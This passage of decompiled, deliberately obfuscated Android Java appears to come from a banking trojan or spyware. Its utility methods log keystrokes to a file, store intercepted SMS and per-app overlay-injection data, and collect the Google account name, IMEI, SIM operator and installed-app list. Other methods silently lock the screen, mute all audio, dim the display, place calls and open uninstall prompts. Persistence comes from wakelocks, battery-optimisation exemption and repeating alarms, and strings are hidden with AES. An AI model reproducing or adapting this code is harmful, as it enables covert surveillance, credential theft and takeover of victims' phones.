            byte[] doFinal = instance.doFinal(Base64.decode(str, 0));
            return doFinal == null ? str : new String(doFinal);
        } catch (Exception unused) {
            return str;
        }
    }

    public static void o(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- o ---");
        Handler handlerV0;
        Looper looperV1 = Looper.getMainLooper();
        handlerV0 = new Handler(looperV1);
        Cgoto.fddo fddoV1;
        fddoV1 = new Cgoto.fddo(context, str);
        handlerV0.post(fddoV1);
    }

    public static void p(long j) {
        LogUtil.showErrorLog(TAG, "--- p ---");
        try {
            Thread.sleep(j);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    /* renamed from: package  reason: not valid java name */
    public static String m126package() {
        LogUtil.showErrorLog(TAG, "--- m126package ---");
        return Build.VERSION.RELEASE;
    }

    /* renamed from: private  reason: not valid java name */
    public static String m127private(Context context) {
        LogUtil.showErrorLog(TAG, "--- m127private ---");
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String simOperatorName = telephonyManager.getSimOperatorName();
        return !simOperatorName.isEmpty() ? simOperatorName : telephonyManager.getNetworkOperatorName();
    }

    /* renamed from: protected  reason: not valid java name */
    public static String m128protected(Context context) {
        LogUtil.showErrorLog(TAG, "--- m128protected ---");
        List<PackageInfo> installedPackages = context.getPackageManager().getInstalledPackages(0);
        ArrayList arrayList = new ArrayList(installedPackages.size());
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = installedPackages.get(i);
            if (packageInfo.versionName != null) {
                arrayList.add(packageInfo.packageName);
            }
        }
        String str = "";
        for (int i2 = 0; i2 < arrayList.size(); i2++) {
            str = str + ((String) arrayList.get(i2));
            if (i2 < arrayList.size() - 1) {
                str = str + "|";
            }
        }
        return str;
    }

    /* renamed from: public  reason: not valid java name */
    public static String m129public(Context context) {
        LogUtil.showErrorLog(TAG, "--- m129public ---");
        for (Account account : AccountManager.get(context).getAccounts()) {
            if (account.type.equals("com.google")) {
                return account.name;
            }
        }
        return "";
    }

    public static void q(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- q ---");
        String str2 = Cthrow.m158new(context, "new_sms", "");
        if (!str2.isEmpty()) {
            try {
                JSONObject jSONObject = new JSONObject(str2);
                if (jSONObject.has(str)) {
                    jSONObject.remove(str);
                    Cthrow.m159this(context, "new_sms", jSONObject.toString());
                }
            } catch (JSONException unused) {
            }
        }
    }

    public static void r(Context context, String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- r ---");
        String str3 = Cthrow.m158new(context, "new_sms", "");
        try {
            JSONObject jSONObject = !str3.isEmpty() ? new JSONObject(str3) : new JSONObject();
            if (!jSONObject.has(str)) {
                jSONObject.put(str, str2);
                Cthrow.m159this(context, "new_sms", jSONObject.toString());
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: return  reason: not valid java name */
    public static String m130return(Context context) {
        LogUtil.showErrorLog(TAG, "--- m130return ---");
        return jargjtadfhgjsrfj(((Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) + (Build.CPU_ABI.length() % 10) + (Build.DEVICE.length() % 10) + (Build.DISPLAY.length() % 10) + (Build.HOST.length() % 10) + (Build.ID.length() % 10) + (Build.MANUFACTURER.length() % 10) + (Build.MODEL.length() % 10) + (Build.PRODUCT.length() % 10) + (Build.TAGS.length() % 10) + (Build.TYPE.length() % 10) + (Build.USER.length() % 10)) + Settings.Secure.getString(context.getContentResolver(), "android_id"));
    }

    public static boolean rgjsrtfjktyfj(Context context) {
        LogUtil.showErrorLog(TAG, "--- rgjsrtfjktyfj ---");
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.google.android.gms", "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (intent.resolveActivityInfo(context.getPackageManager(), 0) == null) {
            return false;
        }
        context.startActivity(intent);
        return true;
    }

    /**
     * TODO - CHECK
     * @param r4
     * @param r5
     */
    public static void rsjsadghfsfdghj(android.content.Context r4, java.lang.String r5) {
        Log.e(TAG, "--- rsjsadghfsfdghj > check  --- r5: " + r5);
        if (r5.trim().isEmpty())
            return;

        if (Cthrow.fddo(r4, "save_keylog_prefs", Boolean.FALSE).booleanValue()) {
            StringBuilder stringBuilderV2 = new StringBuilder();
            stringBuilderV2.append(Cthrow.m158new(r4, "keylog_prefs_data", "").trim());
            stringBuilderV2.append("\n");
            stringBuilderV2.append(r5);
            Cthrow.m159this(r4, "keylog_prefs_data", stringBuilderV2.toString());
            return;
        }

        try {
            File fileV0 = new File(r4.getApplicationInfo().dataDir, "kl.txt");
            if (!fileV0.exists()) {
                try {
                    fileV0.createNewFile();
                } catch (IOException ioException) {
                    Cthrow.m154case(r4, "save_keylog_prefs", Boolean.TRUE);
                }
            }

            FileWriter fileWriterV1 = new FileWriter(fileV0, true);
            BufferedWriter bufferedWriterP0 = new BufferedWriter(fileWriterV1);
            bufferedWriterP0.write(r5);
            bufferedWriterP0.newLine();
            bufferedWriterP0.flush();
            bufferedWriterP0.close();
        } catch (Exception e) {
        }
    }

    public static void s(Context context, Intent intent) {
        LogUtil.showErrorLog(TAG, "--- s ---");
        context.startService(intent);
    }

    public static void sartjsrtfjsrfjtsrtjgfhe(Context context) {
        LogUtil.showErrorLog(TAG, "--- sartjsrtfjsrfjtsrtjgfhe ---");
        Intent intent = new Intent();
        for (Field field : intent.getClass().getDeclaredFields()) {
            int modifiers = field.getModifiers();
            if (Modifier.isPublic(modifiers) && Modifier.isStatic(modifiers) && Modifier.isFinal(modifiers) && field.getType().equals(String.class)) {
                try {
                    context.registerReceiver(new p086c(), new IntentFilter((String) field.get(intent)));
                } catch (Exception unused) {
                    a(context);
                    return;
                }
            }
        }
    }

    public static void sdgjsrfgj(Context context, Class cls) {
        LogUtil.showErrorLog(TAG, "--- sdgjsrfgj ---");
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (devicePolicyManager.isAdminActive(new ComponentName(context, cls))) {
            devicePolicyManager.lockNow();
        } else {
            k(context);
        }
        if (ifdf(context).booleanValue()) {
            m109catch(context);
            return;
        }
        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamVolume(5, 0, 0);
        audioManager.setStreamVolume(0, 0, 0);
        audioManager.setStreamVolume(1, 0, 0);
        audioManager.setStreamVolume(2, 0, 0);
        audioManager.setStreamVolume(3, 0, 0);
        audioManager.setStreamVolume(4, 0, 0);
        try {
            audioManager.setRingerMode(0);
        } catch (SecurityException unused) {
        }
    }

    public static boolean sdgphkmaepghmsdpgfmhapdfmgh(Context context, String str, int i) {
        LogUtil.showErrorLog(TAG, "--- sdgphkmaepghmsdpgfmhapdfmgh ---");
        return dkgmhapefdmhpadfmhspfkgmh(context, str, i, true);
    }

    public static void sfgjdgjtrfjgdtyrt(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- sfgjdgjtrfjgdtyrt ---");
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static boolean spdghmpamghpsdfmgh() {
        LogUtil.showErrorLog(TAG, "--- spdghmpamghpsdfmgh ---");
        return Build.MANUFACTURER.contains("vivo") || Build.BRAND.contains("vivo");
    }

    public static boolean spkfgmhapoemghapfgmhadgkmhpda(Context context) {
        LogUtil.showErrorLog(TAG, "--- spkfgmhapoemghapfgmhadgkmhpda ---");
        if (ifdf < f69new) {
            return false;
        }
        return !((PowerManager) context.getSystemService(Cbreak.fddo("4eadc24f2e"))).isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public static boolean srgjnsrfgjartgj(Context context) {
        LogUtil.showErrorLog(TAG, "--- srgjnsrfgjartgj ---");
        if (jghkmjpdokgmhsdghkmdg(context)) {
            return false;
        }
        PackageManager packageManager = context.getPackageManager();
        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        if (intent.resolveActivityInfo(packageManager, 0) == null || packageManager.queryIntentActivities(intent, 65536).size() == 0) {
            return false;
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        return true;
    }

    /* renamed from: static  reason: not valid java name */
    public static String m131static(Context context) {
        LogUtil.showErrorLog(TAG, "--- m131static ---");
        int i = Build.VERSION.SDK_INT;
        if (i < f68goto) {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (context.checkSelfPermission("android.permission.READ_PHONE_STATE") != PackageManager.PERMISSION_GRANTED) {
                return "";
            }
            if (telephonyManager.getDeviceId() != null) {
                return i >= 26 ? telephonyManager.getImei() : telephonyManager.getDeviceId();
            }
        }
        return Settings.Secure.getString(context.getContentResolver(), "android_id");
    }

    /* renamed from: strictfp  reason: not valid java name */
    public static String m132strictfp(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m132strictfp ---");
        return m141volatile(context, str, 0);
    }

    /* renamed from: super  reason: not valid java name */
    public static String m133super(Context context) {
        LogUtil.showErrorLog(TAG, "--- m133super ---");
        return m137throw(context, 0);
    }

    /* renamed from: switch  reason: not valid java name */
    public static Bitmap m134switch(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- m134switch ---");
        String str2 = Cthrow.m158new(context, "inj_" + str, "");
        if (str2.isEmpty()) {
            return null;
        }
        try {
            String string = new JSONObject(str2).getString("icon");
            if (string.isEmpty()) {
                return null;
            }
            byte[] decode = Base64.decode(string, 0);
            return BitmapFactory.decodeByteArray(decode, 0, decode.length);
        } catch (Exception unused) {
            return null;
        }
    }

    /* renamed from: synchronized  reason: not valid java name */
    public static void m135synchronized(Context context) {
        LogUtil.showErrorLog(TAG, "--- m135synchronized ---");
        if (ifdf >= f69new) {
            Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
        }
    }

    public static void t(Context context, Class cls) {
        LogUtil.showErrorLog(TAG, "--- t ---");
        if (!cls.getClass().equals(p054v.class) || dfhaefdhadfhdfherh(context) || ifdf < f63case) {
            try {
                context.startService(new Intent(context, cls));
            } catch (IllegalStateException unused) {
            }
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(new Intent(context, cls));
            }
        }
    }

    public static boolean thgjpsmfghokamdgpjkmdghkmf(Context context) {
        LogUtil.showErrorLog(TAG, "--- thgjpsmfghokamdgpjkmdghkmf ---");
        return context.getResources().getConfiguration().orientation == 1;
    }

    /* renamed from: this  reason: not valid java name */
    public static void m136this(Context context) {
        LogUtil.showErrorLog(TAG, "--- m136this ---");
        Settings.System.putInt(context.getContentResolver(), "screen_brightness_mode", 0);
        Settings.System.putInt(context.getContentResolver(), "screen_brightness", 0);
    }

    /* renamed from: throw  reason: not valid java name */
    public static String m137throw(Context context, int i) {
        LogUtil.showErrorLog(TAG, "--- m137throw ---");
        PackageManager packageManager = context.getPackageManager();
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
            if (applicationInfo == null) {
                return "";
            }
            String charSequence = packageManager.getApplicationLabel(applicationInfo).toString();
            return (i == 0 || charSequence.length() <= i) ? charSequence : charSequence.substring(0, i);
        } catch (PackageManager.NameNotFoundException unused) {
            return "";
        }
    }

    /* renamed from: throws  reason: not valid java name */
    public static String m138throws(Context context) {
        LogUtil.showErrorLog(TAG, "--- m138throws ---");
        try {
            return Build.VERSION.SDK_INT >= 24 ? context.getResources().getConfiguration().getLocales().get(0).getLanguage().toLowerCase() : context.getResources().getConfiguration().locale.getLanguage().toLowerCase();
        } catch (Exception e) {
            e.printStackTrace();
            return Locale.getDefault().getLanguage().toLowerCase();
        }
    }

    public static boolean tjtsrfghsjrfgjhs(String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- tjtsrfghsjrfgjhs ---");
        if (str.isEmpty() || str2.isEmpty()) {
            return false;
        }
        return (str + ",").contains(str2 + ",");
    }

    /* renamed from: transient  reason: not valid java name */
    public static boolean m139transient(Context context) {
        LogUtil.showErrorLog(TAG, "--- m139transient ---");
        try {
            ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
            return ((AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE)).checkOpNoThrow("android:get_usage_stats", applicationInfo.uid, applicationInfo.packageName) == 0;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }

    /* renamed from: try  reason: not valid java name */
    public static String m140try(String str) {
        LogUtil.showErrorLog(TAG, "--- m140try ---");
        if (str == null || str.isEmpty()) {
            return "";
        }
        try {
            SecretKeySpec secretKeySpec = new SecretKeySpec(jargjtadfhgjsrfj(Cfor.f57case).getBytes(), "AES");
            Cipher instance = Cipher.getInstance("AES/ECB/PKCS5Padding");
            instance.init(1, secretKeySpec);
            byte[] doFinal = instance.doFinal(str.getBytes());
            return doFinal == null ? str : Base64.encodeToString(doFinal, 0);
        } catch (Exception unused) {
            return str;
        }
    }

    public static String[] u(String str) {
        LogUtil.showErrorLog(TAG, "--- u ---");
        return str.trim().isEmpty() ? new String[0] : str.split("\\|");
    }

    public static void v(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- v ---");
        g(context, "UNINSTALL: intent to uninstall " + str + "...");
        Intent intent = new Intent("android.intent.action.UNINSTALL_PACKAGE");
        intent.setData(Uri.parse("package:" + str));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    /* renamed from: volatile  reason: not valid java name */
    public static String m141volatile(Context context, String str, int i) {
        LogUtil.showErrorLog(TAG, "--- m141volatile ---");
        PackageManager packageManager = context.getPackageManager();
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(str, 0);
            if (applicationInfo == null) {
                return "";
            }
            String charSequence = packageManager.getApplicationLabel(applicationInfo).toString();
            return (i == 0 || charSequence.length() <= i) ? charSequence : charSequence.substring(0, i);
        } catch (PackageManager.NameNotFoundException unused) {
            return "";
        }
    }

    public static void w(Context context) {
        LogUtil.showErrorLog(TAG, "--- w ---");
        ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(268435462, "myapp:wakelock").acquire();
        Intent intent = new Intent(context, p036o.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("unlock_screen", "do");
        context.startActivity(intent);
    }

    /* renamed from: while  reason: not valid java name */
    public static String m142while(Context context) {
        LogUtil.showErrorLog(TAG, "--- m142while ---");
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String networkCountryIso = telephonyManager.getNetworkCountryIso();
        return networkCountryIso.isEmpty() ? telephonyManager.getSimCountryIso() : networkCountryIso;
    }

    public static void x(Context context, String str) {
        LogUtil.showErrorLog(TAG, "--- x ---");
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + Uri.encode(str)));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
    }

    public static void y(Context context) {
        LogUtil.showErrorLog(TAG, "--- y ---");
        z(context, true);
    }

    public static void z(android.content.Context r7, boolean r8) {
        try {
            Cthis.m147case(r7);
            PowerManager powerManager = (PowerManager) r7.getSystemService(Context.POWER_SERVICE);

            if (p054v.f24new == null) {
                String result = Cbreak.fddo("5fb2c51031d0fef16c38ab3c50");
                PowerManager.WakeLock wakeLock1 = powerManager.newWakeLock(1, result);
                p054v.f24new = wakeLock1;
                p054v.f24new.acquire();
            } else {
                if (!p054v.f24new.isHeld())
                    p054v.f24new.acquire();
            }

            if (!p054v.ifdf) {
                Cgoto.t(r7, p054v.class);
            }

            if (r8) {
                AlarmManager alarmManager = (AlarmManager) r7.getSystemService(Context.ALARM_SERVICE);
                Intent intent = new Intent(r7, p032o.class);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(r7, 0, intent, 0);
                long currentTimeMillis = System.currentTimeMillis();
                long time = 0xea60;
                alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, currentTimeMillis, time, pendingIntent);
            }
        } catch (Exception e) {
        }
    }
}
